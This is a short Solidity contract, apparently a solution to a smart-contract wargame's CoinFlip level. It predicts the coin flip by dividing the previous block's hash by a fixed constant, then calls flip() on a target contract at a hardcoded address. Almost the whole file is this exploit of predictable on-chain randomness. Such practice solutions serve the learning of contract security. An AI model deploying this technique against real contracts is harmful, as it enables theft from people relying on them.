// SPDX-License-Identifier: MIT
pragma solidity 0.8.14;

import "./CoinFlip.sol";

contract CoinFlipAttack {
    CoinFlip public coinFlipContract;

    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
      coinFlipContract = CoinFlip(0xbdc9F23Eb6b04DC6873e116bEcCF418B4543cc7f);
    }

    function rigggedFlip() public {
      uint256 blockValue = uint256(blockhash(block.number - 1));

      uint256 coinFlip = blockValue/FACTOR;
      bool side = coinFlip == 1 ? true : false;
      
      coinFlipContract.flip(side);
    }

}
